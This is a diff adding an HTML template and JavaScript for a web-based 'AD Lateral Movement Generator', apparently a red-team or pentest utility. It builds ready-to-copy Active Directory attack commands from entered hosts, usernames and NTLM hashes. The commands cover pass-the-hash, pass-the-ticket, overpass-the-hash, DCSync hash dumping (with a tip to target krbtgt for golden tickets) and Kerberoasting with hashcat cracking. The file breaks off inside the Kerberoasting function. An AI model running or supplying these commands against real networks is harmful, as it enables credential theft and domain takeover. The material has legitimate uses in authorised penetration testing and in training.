@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AD Lateral Movement Generator — Multiblade</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Syne:wght@700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#080a12; --s1:#0d0f1c; --s2:#121525; --s3:#191d31;
+      --border:#1e2240; --border-hi:#2d3260;
+      --text:#dde1f5; --text-dim:#6b7099; --text-faint:#373b5c;
+      --accent:#6366f1; --accent-hi:#818cf8; --accent-glow:#6366f133;
+      --radius:12px; --radius-sm:7px; --ease:cubic-bezier(0.16,1,0.3,1);
+    }
+    body { background:var(--bg); color:var(--text); font-family:'Inter',system-ui,sans-serif; font-size:14px; line-height:1.6; }
+
+    /* Background blobs */
+    .bg-layer { position:fixed; inset:0; z-index:0; pointer-events:none; overflow:hidden; }
+    .blob { position:absolute; border-radius:50%; filter:blur(100px); }
+    .blob-1 { width:700px; height:700px; background:radial-gradient(circle,#6366f114,transparent 70%); top:-200px; left:60px; animation:d1 22s ease-in-out infinite alternate; }
+    .blob-2 { width:500px; height:500px; background:radial-gradient(circle,#7c3aed0a,transparent 70%); bottom:-100px; right:0; animation:d2 26s ease-in-out infinite alternate; }
+    .blob-3 { width:400px; height:400px; background:radial-gradient(circle,#0ea5e908,transparent 70%); top:40%; left:40%; animation:d1 30s ease-in-out infinite alternate-reverse; }
+    .grid-ov { position:absolute; inset:0; background-image:radial-gradient(circle,#6366f10a 1px,transparent 1px); background-size:28px 28px; }
+    @keyframes d1 { to { transform:translate(40px,30px) scale(1.06); } }
+    @keyframes d2 { to { transform:translate(-30px,-40px) scale(1.1); } }
+
+    /* Layout */
+    .main { position:relative; z-index:1; margin-left:60px; min-height:100vh; display:flex; flex-direction:column; }
+
+    /* Page header */
+    .page-header {
+      position:sticky; top:0; z-index:50;
+      background:var(--bg); border-bottom:1px solid var(--border);
+      padding:14px 28px 12px;
+      display:flex; align-items:center; gap:16px;
+      backdrop-filter:blur(12px);
+    }
+    .back-link {
+      color:var(--text-faint); text-decoration:none; font-size:0.75rem;
+      transition:color 0.15s; white-space:nowrap; flex-shrink:0;
+    }
+    .back-link:hover { color:var(--text-dim); }
+    .ph-divider { width:1px; height:20px; background:var(--border); flex-shrink:0; }
+    .ph-icon-badge {
+      width:36px; height:36px; border-radius:9px; flex-shrink:0;
+      background:#6366f118; border:1px solid #6366f140;
+      display:grid; place-items:center; font-size:1.1rem;
+    }
+    .ph-title { font-family:'Syne',sans-serif; font-size:1.05rem; font-weight:800; letter-spacing:0.04em; }
+    .ph-sub { font-size:0.72rem; color:var(--text-faint); margin-top:1px; font-family:'Fira Code',monospace; letter-spacing:0.02em; }
+    .ph-badge {
+      margin-left:auto; font-size:0.62rem; font-weight:700; letter-spacing:0.1em;
+      text-transform:uppercase; padding:3px 10px; border-radius:99px;
+      background:#6366f114; color:var(--accent-hi); border:1px solid #6366f130;
+      flex-shrink:0;
+    }
+
+    /* Content area */
+    .content { padding:24px 28px 60px; flex:1; max-width:1200px; }
+
+    /* Shared inputs card */
+    .shared-inputs {
+      background:var(--s1); border:1px solid var(--border); border-radius:var(--radius);
+      padding:18px 20px 20px; margin-bottom:20px;
+    }
+    .shared-inputs-hdr {
+      font-size:0.62rem; font-weight:700; letter-spacing:0.12em; text-transform:uppercase;
+      color:var(--text-faint); margin-bottom:14px; display:flex; align-items:center; gap:8px;
+    }
+    .shared-inputs-hdr::after { content:''; flex:1; height:1px; background:var(--border); }
+    .inputs-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:12px; }
+    .field-label { font-size:0.62rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; color:var(--text-faint); margin-bottom:5px; display:block; }
+    .field-input {
+      width:100%; background:var(--s2); border:1px solid var(--border); border-radius:var(--radius-sm);
+      padding:8px 11px; color:var(--text); font-family:'Fira Code',monospace; font-size:0.8rem; outline:none;
+      transition:border-color 0.15s, box-shadow 0.15s;
+    }
+    .field-input:focus { border-color:var(--accent); box-shadow:0 0 0 3px var(--accent-glow); }
+    .field-input::placeholder { color:var(--text-faint); font-family:'Inter',sans-serif; }
+    .field-hint { font-size:0.68rem; color:var(--text-faint); margin-top:4px; font-family:'Fira Code',monospace; }
+
+    /* Technique tabs */
+    .technique-tabs {
+      display:flex; gap:2px; margin-bottom:20px;
+      background:var(--s1); border:1px solid var(--border); border-radius:var(--radius);
+      padding:4px;
+    }
+    .tab-btn {
+      flex:1; padding:9px 12px; font-family:'Inter',sans-serif; font-size:0.78rem; font-weight:600;
+      background:transparent; border:none; cursor:pointer; color:var(--text-dim);
+      border-radius:9px; transition:all 0.15s; white-space:nowrap;
+      display:flex; flex-direction:column; align-items:center; gap:2px; position:relative;
+    }
+    .tab-btn:hover:not(.active) { color:var(--text); background:var(--s2); }
+    .tab-btn.active { background:var(--s2); color:var(--text); border-bottom:2px solid var(--accent); padding-bottom:7px; }
+    .tab-btn.active .tab-icon { color:var(--accent-hi); }
+    .tab-icon { font-size:1rem; }
+    .tab-label { font-size:0.68rem; letter-spacing:0.04em; }
+    .tab-mitre { font-size:0.58rem; color:var(--text-faint); font-family:'Fira Code',monospace; }
+    .tab-btn.active .tab-mitre { color:var(--accent); }
+
+    /* Tab panes */
+    .tab-pane { display:none; animation:fade-in 0.18s var(--ease); }
+    .tab-pane.active { display:block; }
+    @keyframes fade-in { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:translateY(0); } }
+
+    /* Per-tab extra inputs */
+    .tab-inputs {
+      background:var(--s1); border:1px solid var(--border); border-radius:var(--radius);
+      padding:16px 18px 18px; margin-bottom:18px;
+    }
+    .tab-inputs-hdr {
+      font-size:0.6rem; font-weight:700; letter-spacing:0.12em; text-transform:uppercase;
+      color:var(--text-faint); margin-bottom:12px; display:flex; align-items:center; gap:8px;
+    }
+    .tab-inputs-hdr::after { content:''; flex:1; height:1px; background:var(--border); }
+    .tab-inputs-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:10px; }
+
+    /* Command blocks */
+    .cmd-blocks { display:flex; flex-direction:column; gap:12px; }
+    .cmd-block {
+      background:var(--s1); border:1px solid var(--border); border-radius:var(--radius);
+      overflow:hidden; transition:border-color 0.15s;
+    }
+    .cmd-block:hover { border-color:var(--border-hi); }
+    .cmd-block-header {
+      display:flex; align-items:center; justify-content:space-between;
+      padding:9px 14px 8px; border-bottom:1px solid var(--border); background:var(--s2);
+    }
+    .cmd-label-wrap { display:flex; align-items:center; gap:8px; }
+    .cmd-label {
+      font-size:0.68rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase;
+      color:var(--text-dim); font-family:'Inter',sans-serif;
+    }
+    .cmd-platform-badge {
+      font-size:0.58rem; padding:1px 7px; border-radius:99px;
+      background:var(--s3); border:1px solid var(--border); color:var(--text-faint);
+    }
+    .cmd-platform-badge.windows { background:#7c3aed14; border-color:#7c3aed30; color:#a78bfa; }
+    .cmd-platform-badge.linux   { background:#059e5a14; border-color:#059e5a30; color:#34d399; }
+    .cmd-copy-btn {
+      background:none; border:1px solid var(--border); border-radius:6px; cursor:pointer;
+      color:var(--text-faint); font-size:0.72rem; padding:3px 10px; font-family:'Inter',sans-serif;
+      font-weight:600; transition:all 0.15s; display:flex; align-items:center; gap:5px;
+    }
+    .cmd-copy-btn:hover { border-color:var(--accent); color:var(--accent-hi); background:var(--accent-glow); }
+    .cmd-copy-btn.copied { border-color:#22d3ee50; color:#22d3ee; background:#22d3ee10; }
+    .cmd-code {
+      padding:14px 16px; font-family:'Fira Code',monospace; font-size:0.8rem;
+      line-height:1.7; color:var(--text); white-space:pre; overflow-x:auto;
+      background:transparent; cursor:text;
+    }
+    .cmd-code .ph { color:var(--text-faint); } /* placeholder parts */
+    .cmd-code .kw { color:var(--accent-hi); }   /* tool name */
+    .cmd-code .fl { color:#93c5fd; }             /* flags */
+    .cmd-code .vl { color:#86efac; }             /* values */
+    .cmd-code .cm { color:var(--text-faint); font-style:italic; } /* comments */
+
+    /* Note block */
+    .cmd-note {
+      padding:8px 14px 10px; border-top:1px solid var(--border);
+      font-size:0.73rem; color:var(--text-faint); background:var(--s2);
+      font-family:'Fira Code',monospace; line-height:1.5;
+    }
+    .cmd-note strong { color:var(--text-dim); }
+
+    /* Section subheading */
+    .section-subhdr {
+      font-size:0.62rem; font-weight:700; letter-spacing:0.12em; text-transform:uppercase;
+      color:var(--text-faint); margin:20px 0 10px; display:flex; align-items:center; gap:8px;
+    }
+    .section-subhdr::before { content:''; flex:0 0 16px; height:1px; background:var(--border); }
+    .section-subhdr::after { content:''; flex:1; height:1px; background:var(--border); }
+
+    /* Checkbox row */
+    .opt-row { display:flex; align-items:center; gap:8px; margin-bottom:10px; }
+    .opt-row label { font-size:0.8rem; color:var(--text-dim); cursor:pointer; display:flex; align-items:center; gap:8px; }
+    .opt-row input[type="checkbox"] { accent-color:var(--accent); width:14px; height:14px; cursor:pointer; }
+    .opt-flag { font-family:'Fira Code',monospace; font-size:0.72rem; color:var(--text-faint); margin-left:4px; }
+
+    ::-webkit-scrollbar { width:5px; height:5px; }
+    ::-webkit-scrollbar-track { background:transparent; }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--border-hi); }
+  </style>
+</head>
+<body>
+<div class="bg-layer" aria-hidden="true">
+  <div class="blob blob-1"></div>
+  <div class="blob blob-2"></div>
+  <div class="blob blob-3"></div>
+  <div class="grid-ov"></div>
+</div>
+
+{% set active_page = "ad-auth" %}
+{% include '_nav.html' %}
+
+<div class="main">
+
+  <!-- Page header -->
+  <div class="page-header">
+    <a href="/generators" class="back-link">← Generators</a>
+    <div class="ph-divider"></div>
+    <div class="ph-icon-badge">🏛</div>
+    <div>
+      <div class="ph-title">AD Lateral Movement Generator</div>
+      <div class="ph-sub">Pass-the-Hash · Pass-the-Ticket · DCSync · Overpass-the-Hash</div>
+    </div>
+    <span class="ph-badge">Active Directory</span>
+  </div>
+
+  <div class="content">
+
+    <!-- Shared inputs -->
+    <div class="shared-inputs">
+      <div class="shared-inputs-hdr">Shared Credentials</div>
+      <div class="inputs-grid">
+        <div>
+          <label class="field-label" for="f_target">Target Host</label>
+          <input class="field-input" id="f_target" type="text" placeholder="192.168.1.100" oninput="rebuild()" />
+        </div>
+        <div>
+          <label class="field-label" for="f_domain">Domain</label>
+          <input class="field-input" id="f_domain" type="text" placeholder="CORP.LOCAL" oninput="rebuild()" />
+        </div>
+        <div>
+          <label class="field-label" for="f_username">Username</label>
+          <input class="field-input" id="f_username" type="text" placeholder="administrator" oninput="rebuild()" />
+        </div>
+        <div>
+          <label class="field-label" for="f_nthash">NT Hash</label>
+          <input class="field-input" id="f_nthash" type="text" placeholder="aad3b435b51404eeaad3b435b51404ee" maxlength="32" oninput="rebuild()" />
+          <div class="field-hint">32-char hex NTLM hash</div>
+        </div>
+        <div>
+          <label class="field-label" for="f_lmhash">LM Hash</label>
+          <input class="field-input" id="f_lmhash" type="text" value="aad3b435b51404eeaad3b435b51404ee" oninput="rebuild()" />
+          <div class="field-hint">blank LM placeholder</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Technique tabs -->
+    <div class="technique-tabs" role="tablist">
+      <button class="tab-btn active" role="tab" aria-selected="true"  onclick="switchTab('pth')"       id="tabbtn-pth">
+        <span class="tab-icon">🔑</span>
+        <span class="tab-label">Pass-the-Hash</span>
+        <span class="tab-mitre">T1550.002</span>
+      </button>
+      <button class="tab-btn" role="tab" aria-selected="false" onclick="switchTab('ptt')"       id="tabbtn-ptt">
+        <span class="tab-icon">🎫</span>
+        <span class="tab-label">Pass-the-Ticket</span>
+        <span class="tab-mitre">T1550.003</span>
+      </button>
+      <button class="tab-btn" role="tab" aria-selected="false" onclick="switchTab('opth')"      id="tabbtn-opth">
+        <span class="tab-icon">⚗</span>
+        <span class="tab-label">Overpass-the-Hash</span>
+        <span class="tab-mitre">T1550.002</span>
+      </button>
+      <button class="tab-btn" role="tab" aria-selected="false" onclick="switchTab('dcsync')"    id="tabbtn-dcsync">
+        <span class="tab-icon">🗄</span>
+        <span class="tab-label">DCSync</span>
+        <span class="tab-mitre">T1003.006</span>
+      </button>
+      <button class="tab-btn" role="tab" aria-selected="false" onclick="switchTab('kerbroast')" id="tabbtn-kerbroast">
+        <span class="tab-icon">🍩</span>
+        <span class="tab-label">Kerberoasting</span>
+        <span class="tab-mitre">T1558.003</span>
+      </button>
+    </div>
+
+    <!-- ═══════════════════════════════════════════ TAB 1: PTH ══ -->
+    <div class="tab-pane active" id="tab-pth" role="tabpanel">
+      <div class="tab-inputs">
+        <div class="tab-inputs-hdr">PTH Options</div>
+        <div class="tab-inputs-grid">
+          <div>
+            <label class="field-label" for="f_pth_exec">Exec Method (nxc)</label>
+            <select class="field-input" id="f_pth_exec" onchange="rebuild()" style="cursor:pointer;appearance:none;background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%236b7099'/%3E%3C/svg%3E\");background-repeat:no-repeat;background-position:right 10px center;padding-right:28px;">
+              <option value="">Default (wmiexec)</option>
+              <option value="smbexec">smbexec</option>
+              <option value="wmiexec">wmiexec</option>
+            </select>
+          </div>
+          <div>
+            <label class="field-label" for="f_pth_cmd">Remote Command</label>
+            <input class="field-input" id="f_pth_cmd" type="text" placeholder="whoami" oninput="rebuild()" />
+          </div>
+        </div>
+        <div style="margin-top:12px;">
+          <div class="field-label" style="margin-bottom:8px;">Extra nxc flags</div>
+          <div class="opt-row"><label><input type="checkbox" id="f_pth_shares" onchange="rebuild()" /><span>Enumerate shares</span><span class="opt-flag">--shares</span></label></div>
+          <div class="opt-row"><label><input type="checkbox" id="f_pth_sam" onchange="rebuild()" /><span>Dump SAM</span><span class="opt-flag">--sam</span></label></div>
+          <div class="opt-row"><label><input type="checkbox" id="f_pth_lsa" onchange="rebuild()" /><span>Dump LSA secrets</span><span class="opt-flag">--lsa</span></label></div>
+        </div>
+      </div>
+
+      <div class="cmd-blocks" id="pth-blocks">
+        <!-- populated by JS -->
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════ TAB 2: PTT ══ -->
+    <div class="tab-pane" id="tab-ptt" role="tabpanel">
+      <div class="tab-inputs">
+        <div class="tab-inputs-hdr">Ticket Options</div>
+        <div class="tab-inputs-grid">
+          <div style="grid-column:1 / -1">
+            <label class="field-label" for="f_ticket_path">Ticket File Path</label>
+            <input class="field-input" id="f_ticket_path" type="text" placeholder="/tmp/administrator.ccache" oninput="rebuild()" />
+            <div class="field-hint">.ccache (Linux) or .kirbi (Windows/Rubeus)</div>
+          </div>
+          <div>
+            <label class="field-label" for="f_kirbi_in">kirbi→ccache: Input</label>
+            <input class="field-input" id="f_kirbi_in" type="text" placeholder="ticket.kirbi" oninput="rebuild()" />
+          </div>
+          <div>
+            <label class="field-label" for="f_kirbi_out">kirbi→ccache: Output</label>
+            <input class="field-input" id="f_kirbi_out" type="text" placeholder="ticket.ccache" oninput="rebuild()" />
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-blocks" id="ptt-blocks"></div>
+    </div>
+
+    <!-- ════════════════════════════════════════════ TAB 3: OPtH ══ -->
+    <div class="tab-pane" id="tab-opth" role="tabpanel">
+      <div class="tab-inputs">
+        <div class="tab-inputs-hdr">Overpass Options</div>
+        <div class="tab-inputs-grid">
+          <div>
+            <label class="field-label" for="f_opth_ccout">ccache Output File</label>
+            <input class="field-input" id="f_opth_ccout" type="text" placeholder="administrator.ccache" oninput="rebuild()" />
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-blocks" id="opth-blocks"></div>
+    </div>
+
+    <!-- ══════════════════════════════════════════ TAB 4: DCSync ══ -->
+    <div class="tab-pane" id="tab-dcsync" role="tabpanel">
+      <div class="tab-inputs">
+        <div class="tab-inputs-hdr">DCSync Options</div>
+        <div class="tab-inputs-grid">
+          <div>
+            <label class="field-label" for="f_dc_ip">DC IP Address</label>
+            <input class="field-input" id="f_dc_ip" type="text" placeholder="192.168.1.10" oninput="rebuild()" />
+          </div>
+          <div>
+            <label class="field-label" for="f_dcsync_user">Target User (secretsdump)</label>
+            <input class="field-input" id="f_dcsync_user" type="text" placeholder="krbtgt" oninput="rebuild()" />
+            <div class="field-hint">leave blank to dump all</div>
+          </div>
+          <div>
+            <label class="field-label" for="f_ntds_path">NTDS Path (offline)</label>
+            <input class="field-input" id="f_ntds_path" type="text" placeholder="ntds.dit" oninput="rebuild()" />
+          </div>
+          <div>
+            <label class="field-label" for="f_system_path">SYSTEM Hive (offline)</label>
+            <input class="field-input" id="f_system_path" type="text" placeholder="SYSTEM" oninput="rebuild()" />
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-blocks" id="dcsync-blocks"></div>
+    </div>
+
+    <!-- ══════════════════════════════════════ TAB 5: Kerberoasting ══ -->
+    <div class="tab-pane" id="tab-kerbroast" role="tabpanel">
+      <div class="tab-inputs">
+        <div class="tab-inputs-hdr">Kerberoast Options</div>
+        <div class="tab-inputs-grid">
+          <div>
+            <label class="field-label" for="f_kb_dc_ip">DC IP Address</label>
+            <input class="field-input" id="f_kb_dc_ip" type="text" placeholder="192.168.1.10" oninput="rebuild()" />
+          </div>
+          <div>
+            <label class="field-label" for="f_kb_password">Password</label>
+            <input class="field-input" id="f_kb_password" type="text" placeholder="P@ssw0rd" oninput="rebuild()" />
+            <div class="field-hint">used when hash unavailable</div>
+          </div>
+          <div>
+            <label class="field-label" for="f_kb_outfile">Output File</label>
+            <input class="field-input" id="f_kb_outfile" type="text" value="kerberoast.txt" oninput="rebuild()" />
+          </div>
+          <div>
+            <label class="field-label" for="f_kb_wordlist">Wordlist (hashcat)</label>
+            <input class="field-input" id="f_kb_wordlist" type="text" value="/usr/share/wordlists/rockyou.txt" oninput="rebuild()" />
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-blocks" id="kerbroast-blocks"></div>
+    </div>
+
+  </div><!-- /content -->
+</div><!-- /main -->
+
+<script>
+'use strict';
+
+/* ── Helpers ────────────────────────────────────────────────────────────────── */
+function v(id)  { const el = document.getElementById(id); return el ? el.value.trim() : ''; }
+function chk(id){ const el = document.getElementById(id); return el ? el.checked : false; }
+function ph(s, fallback) { return s || (fallback || ''); }
+
+/* A thin wrapper: if val is non-empty use it, else return placeholder string */
+function p(val, name) { return val || '<' + name + '>'; }
+
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+/* Build a rendered cmd-block HTML string.
+ * `cmd` is the raw command string (already built, no HTML).
+ * `label` is the tool name.
+ * `platform` is 'linux', 'windows', or '' for both.
+ * `note` optional footer note HTML string.
+ */
+function cmdBlockHTML(label, platform, cmd, note) {
+  const platLabel = platform === 'windows' ? 'Windows' : platform === 'linux' ? 'Linux' : '';
+  const platClass = platform || '';
+  return `
+  <div class="cmd-block">
+    <div class="cmd-block-header">
+      <div class="cmd-label-wrap">
+        <span class="cmd-label">${esc(label)}</span>
+        ${platLabel ? `<span class="cmd-platform-badge ${platClass}">${platLabel}</span>` : ''}
+      </div>
+      <button class="cmd-copy-btn" onclick="copyBlock(this)" data-cmd="${esc(cmd)}" title="Copy command">
+        ⧉ Copy
+      </button>
+    </div>
+    <pre class="cmd-code">${esc(cmd)}</pre>
+    ${note ? `<div class="cmd-note">${note}</div>` : ''}
+  </div>`;
+}
+
+function setBlocks(containerId, blocks) {
+  const el = document.getElementById(containerId);
+  if (!el) return;
+  el.innerHTML = blocks.join('');
+}
+
+/* ── Copy ───────────────────────────────────────────────────────────────────── */
+function copyBlock(btn) {
+  const cmd = btn.getAttribute('data-cmd');
+  navigator.clipboard?.writeText(cmd).catch(() => {});
+  btn.textContent = '✓ Copied!';
+  btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('copied'); }, 1200);
+}
+
+/* ── Tab switching ──────────────────────────────────────────────────────────── */
+let currentTab = 'pth';
+
+function switchTab(name) {
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => {
+    b.classList.remove('active');
+    b.setAttribute('aria-selected', 'false');
+  });
+  const pane = document.getElementById('tab-' + name);
+  const btn  = document.getElementById('tabbtn-' + name);
+  if (pane) pane.classList.add('active');
+  if (btn)  { btn.classList.add('active'); btn.setAttribute('aria-selected', 'true'); }
+  currentTab = name;
+  rebuild();
+}
+
+/* ── Main rebuild ───────────────────────────────────────────────────────────── */
+function rebuild() {
+  buildPTH();
+  buildPTT();
+  buildOPtH();
+  buildDCSync();
+  buildKerbroast();
+}
+
+/* ══════════════════════════════════════════════════════════════════════════════
+   TAB 1: Pass-the-Hash
+══════════════════════════════════════════════════════════════════════════════ */
+function buildPTH() {
+  const target   = p(v('f_target'),   'target');
+  const domain   = p(v('f_domain'),   'DOMAIN');
+  const user     = p(v('f_username'), 'username');
+  const nt       = p(v('f_nthash'),   'NTHASH');
+  const lm       = v('f_lmhash') || 'aad3b435b51404eeaad3b435b51404ee';
+
+  const execMethod = v('f_pth_exec');
+  const remoteCmd  = v('f_pth_cmd');
+  const shares     = chk('f_pth_shares');
+  const sam        = chk('f_pth_sam');
+  const lsa        = chk('f_pth_lsa');
+
+  /* 1. netexec */
+  let nxc = `nxc smb ${target} -u ${user} -H ${nt} -d ${domain}`;
+  if (execMethod)  nxc += ` --exec-method ${execMethod}`;
+  if (remoteCmd)   nxc += ` -x "${remoteCmd}"`;
+  if (shares)      nxc += ' --shares';
+  if (sam)         nxc += ' --sam';
+  if (lsa)         nxc += ' --lsa';
+
+  /* 2-5. Impacket + evil-winrm */
+  const hashes = `${lm}:${nt}`;
+  const dpair  = `${domain}/${user}@${target}`;
+
+  const psexec    = `psexec.py ${dpair} -hashes ${hashes}`;
+  const wmiexec   = `wmiexec.py ${dpair} -hashes ${hashes}`;
+  const smbexec   = `smbexec.py ${dpair} -hashes ${hashes}`;
+  const evilwinrm = `evil-winrm -i ${target} -u ${user} -H ${nt}`;
+
+  setBlocks('pth-blocks', [
+    cmdBlockHTML('netexec (nxc)', 'linux', nxc),
+    cmdBlockHTML('impacket psexec', 'linux', psexec),
+    cmdBlockHTML('impacket wmiexec', 'linux', wmiexec),
+    cmdBlockHTML('impacket smbexec', 'linux', smbexec),
+    cmdBlockHTML('evil-winrm', 'linux', evilwinrm,
+      '<strong>Install:</strong> gem install evil-winrm'),
+  ]);
+}
+
+/* ══════════════════════════════════════════════════════════════════════════════
+   TAB 2: Pass-the-Ticket
+══════════════════════════════════════════════════════════════════════════════ */
+function buildPTT() {
+  const target  = p(v('f_target'),      'target');
+  const domain  = p(v('f_domain'),      'DOMAIN');
+  const user    = p(v('f_username'),    'username');
+  const tkt     = p(v('f_ticket_path'), '/tmp/ticket.ccache');
+  const kirbiIn  = v('f_kirbi_in')  || 'ticket.kirbi';
+  const kirbiOut = v('f_kirbi_out') || 'ticket.ccache';
+
+  const dpair = `${domain}/${user}@${target}`;
+
+  const exportEnv  = `export KRB5CCNAME=${tkt}`;
+  const psexecKrb  = `KRB5CCNAME=${tkt} psexec.py ${dpair} -k -no-pass`;
+  const nxcKrb     = `nxc smb ${target} -u ${user} -k --use-kcache`;
+  const rubeusPtt  = `Rubeus.exe ptt /ticket:${tkt}`;
+  const converter  = `impacket-ticketConverter ${kirbiIn} ${kirbiOut}`;
+
+  setBlocks('ptt-blocks', [
+    cmdBlockHTML('env var — set ticket', 'linux', exportEnv,
+      '<strong>Note:</strong> Set KRB5CCNAME before running impacket tools.'),
+    cmdBlockHTML('impacket psexec (Kerberos)', 'linux', psexecKrb),
+    cmdBlockHTML('netexec (nxc) Kerberos', 'linux', nxcKrb),
+    cmdBlockHTML('Rubeus ptt', 'windows', rubeusPtt,
+      '<strong>Note:</strong> Injects ticket into current Windows logon session.'),
+    cmdBlockHTML('kirbi → ccache converter', 'linux', converter,
+      `<strong>Input:</strong> ${esc(kirbiIn)} &nbsp;→&nbsp; <strong>Output:</strong> ${esc(kirbiOut)}`),
+  ]);
+}
+
+/* ══════════════════════════════════════════════════════════════════════════════
+   TAB 3: Overpass-the-Hash
+══════════════════════════════════════════════════════════════════════════════ */
+function buildOPtH() {
+  const domain = p(v('f_domain'),   'DOMAIN');
+  const user   = p(v('f_username'), 'username');
+  const nt     = p(v('f_nthash'),   'NTHASH');
+  const lm     = v('f_lmhash') || 'aad3b435b51404eeaad3b435b51404ee';
+  const ccout  = v('f_opth_ccout') || `${user}.ccache`;
+
+  const hashes = `${lm}:${nt}`;
+
+  const rubeus  = `Rubeus.exe asktgt /user:${user} /rc4:${nt} /domain:${domain} /ptt`;
+  const getTgt  = `getTGT.py ${domain}/${user} -hashes ${hashes}`;
+  const setcc   = `export KRB5CCNAME=${ccout}`;
+  const mimikatz = `sekurlsa::pth /user:${user} /domain:${domain} /ntlm:${nt} /run:"cmd.exe"`;
+
+  setBlocks('opth-blocks', [
+    cmdBlockHTML('Rubeus asktgt', 'windows', rubeus,
+      '<strong>Effect:</strong> Converts NT hash → TGT and injects into current session (/ptt).'),
+    cmdBlockHTML('impacket getTGT', 'linux', getTgt,
+      `<strong>Then:</strong> export KRB5CCNAME=${esc(ccout)} and use impacket kerberos tools.`),
+    cmdBlockHTML('set KRB5CCNAME after getTGT', 'linux', setcc),
+    cmdBlockHTML('mimikatz sekurlsa::pth', 'windows', mimikatz,
+      '<strong>Note:</strong> Spawns new process with Kerberos identity; run from elevated prompt.'),
+  ]);
+}
+
+/* ══════════════════════════════════════════════════════════════════════════════
+   TAB 4: DCSync
+══════════════════════════════════════════════════════════════════════════════ */
+function buildDCSync() {
+  const domain     = p(v('f_domain'),       'DOMAIN');
+  const user       = p(v('f_username'),     'username');
+  const nt         = p(v('f_nthash'),       'NTHASH');
+  const lm         = v('f_lmhash') || 'aad3b435b51404eeaad3b435b51404ee';
+  const dcIp       = p(v('f_dc_ip'),        'DC_IP');
+  const targetUser = v('f_dcsync_user');
+  const ntdsPath   = v('f_ntds_path');
+  const sysPath    = v('f_system_path');
+
+  const hashes = `${lm}:${nt}`;
+  const dpair  = `${domain}/${user}@${dcIp}`;
+
+  /* secretsdump variants */
+  let sdAll  = `secretsdump.py ${dpair} -hashes ${hashes} -just-dc`;
+  let sdUser = targetUser
+    ? `secretsdump.py ${dpair} -hashes ${hashes} -just-dc-user ${targetUser}`
+    : `secretsdump.py ${dpair} -hashes ${hashes} -just-dc-user <target_user>`;
+  let sdOffline = (ntdsPath && sysPath)
+    ? `secretsdump.py -ntds ${ntdsPath} -system ${sysPath} LOCAL`
+    : `secretsdump.py -ntds <ntds.dit> -system <SYSTEM> LOCAL`;
+
+  const nxcNtds  = `nxc smb ${dcIp} -u ${user} -H ${nt} --ntds`;
+  const mimikatz = `lsadump::dcsync /domain:${domain} /user:krbtgt`;
+
+  setBlocks('dcsync-blocks', [
+    cmdBlockHTML('impacket secretsdump — all hashes', 'linux', sdAll,
+      '<strong>Requires:</strong> DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights.'),
+    cmdBlockHTML('impacket secretsdump — specific user', 'linux', sdUser),
+    cmdBlockHTML('impacket secretsdump — offline NTDS', 'linux', sdOffline,
+      '<strong>Offline:</strong> Point at extracted ntds.dit + SYSTEM hive (no network needed).'),
+    cmdBlockHTML('netexec (nxc) --ntds', 'linux', nxcNtds),
+    cmdBlockHTML('mimikatz lsadump::dcsync', 'windows', mimikatz,
+      '<strong>Note:</strong> Run on a domain-joined host with replication rights. Target krbtgt for golden ticket material.'),
+  ]);
+}
+
+/* ══════════════════════════════════════════════════════════════════════════════
+   TAB 5: Kerberoasting
+══════════════════════════════════════════════════════════════════════════════ */
+function buildKerbroast() {
+  const domain   = p(v('f_domain'),      'DOMAIN');
+  const user     = p(v('f_username'),    'username');
+  const nt       = p(v('f_nthash'),      'NTHASH');
+  const lm       = v('f_lmhash') || 'aad3b435b51404eeaad3b435b51404ee';
+  const dcIp     = p(v('f_kb_dc_ip'),    'DC_IP');
+  const password = v('f_kb_password');
+  const outfile  = v('f_kb_outfile')  || 'kerberoast.txt';
+  const wordlist = v('f_kb_wordlist') || '/usr/share/wordlists/rockyou.txt';
+
+  const hashes = `${lm}:${nt}`;
+
+  /* Use password if set, else hash */
+  const getspnsPass = password
+    ? `GetUserSPNs.py ${domain}/${user}:${password} -dc-ip ${dcIp} -request -outputfile ${outfile}`
+    : `GetUserSPNs.py ${domain}/${user} -hashes ${hashes} -dc-ip ${dcIp} -request -outputfile ${outfile}`;
+
+  const nxcLdap  = password
+    ? `nxc ldap ${dcIp} -u ${user} -p ${password} --kerberoasting ${outfile}`
+    : `nxc ldap ${dcIp} -u ${user} -H ${nt} --kerberoasting ${outfile}`;
+
+  const rubeus   = `Rubeus.exe kerberoast /outfile:${outfile}`;
+  const hashcat  = `hashcat -m 13100 ${outfile} ${wordlist}`;
+  const john     = `john --wordlist=${wordlist} --format=krb5tgs ${outfile}`;
+
+  setBlocks('kerbroast-blocks', [
+    cmdBlockHTML('impacket GetUserSPNs', 'linux', getspnsPass,
+      password
+        ? '<strong>Auth:</strong> Using plaintext password.'
+        : '<strong>Auth:</strong> Using NT hash (-hashes). Use -p &lt;password&gt; when hash unavailable.'),
